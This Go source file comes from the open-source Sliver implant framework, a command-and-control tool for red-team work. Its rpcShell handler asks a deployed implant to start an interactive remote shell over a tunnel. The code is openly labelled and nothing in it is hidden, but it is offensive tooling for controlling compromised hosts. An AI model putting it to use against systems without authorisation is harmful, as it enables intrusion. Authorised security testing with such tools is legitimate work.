package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"time"

	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/server/core"

	"github.com/golang/protobuf/proto"
)

func rpcShell(req []byte, timeout time.Duration, resp RPCResponse) {
	shellReq := &sliverpb.ShellReq{}
	proto.Unmarshal(req, shellReq)

	sliver := core.Hive.Sliver(shellReq.SliverID)
	tunnel := core.Tunnels.Tunnel(shellReq.TunnelID)

	startShellReq, err := proto.Marshal(&sliverpb.ShellReq{
		EnablePTY: shellReq.EnablePTY,
		TunnelID:  tunnel.ID,
	})
	if err != nil {
		resp([]byte{}, err)
		return
	}
	rpcLog.Infof("Requesting Sliver %d to start shell", sliver.ID)
	data, err := sliver.Request(sliverpb.MsgShellReq, timeout, startShellReq)
	rpcLog.Infof("Sliver %d responded to shell start request", sliver.ID)
	resp(data, err)
}
